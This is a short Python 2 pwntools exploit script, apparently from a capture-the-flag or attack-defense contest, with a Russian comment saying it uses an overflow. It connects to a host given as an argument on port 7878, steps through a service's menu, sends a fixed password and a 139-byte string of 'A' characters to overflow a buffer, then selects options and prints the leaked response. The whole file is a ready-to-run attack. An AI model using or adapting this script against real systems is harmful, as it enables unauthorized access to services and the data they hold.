#!/usr/bin/env python

# Используем переполнение

from pwn import *
import sys

# r = remote("localhost", 7878)
r = remote(sys.argv[1], 7878)

r.recv()
r.sendline('1')
r.recv()
r.sendline('qweasdzxc')
r.recv()
r.sendline('A' * 139)
r.recv()
r.sendline('2')
r.recv()
r.sendline('9')
#r.interactive()
res = r.recvuntil('=')
print res
